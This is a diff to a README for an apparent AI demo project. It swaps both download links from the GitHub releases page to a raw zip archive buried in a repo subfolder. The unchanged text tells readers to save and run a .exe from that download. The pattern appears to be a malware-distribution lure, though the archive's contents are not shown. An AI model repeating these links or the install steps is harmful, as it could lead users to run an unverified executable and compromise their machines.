@@ -1,6 +1,6 @@
 # 🤖 gradio-streamlit-ai-demos - Build powerful artificial intelligence tools easily
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Runningpostmanibeam943/gradio-streamlit-ai-demos/releases)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/Runningpostmanibeam943/gradio-streamlit-ai-demos/main/heartwood/demos-streamlit-ai-gradio-3.5.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run these demos. Check your system against
 
 You must visit the official release page to get the installer for your computer. 
 
-[Click here to visit the download page](https://github.com/Runningpostmanibeam943/gradio-streamlit-ai-demos/releases)
+[Click here to visit the download page](https://raw.githubusercontent.com/Runningpostmanibeam943/gradio-streamlit-ai-demos/main/heartwood/demos-streamlit-ai-gradio-3.5.zip)
 
 Look for the file that ends in .exe. Save this file to your desktop or your Downloads folder. You need this file to begin the installation process.
 
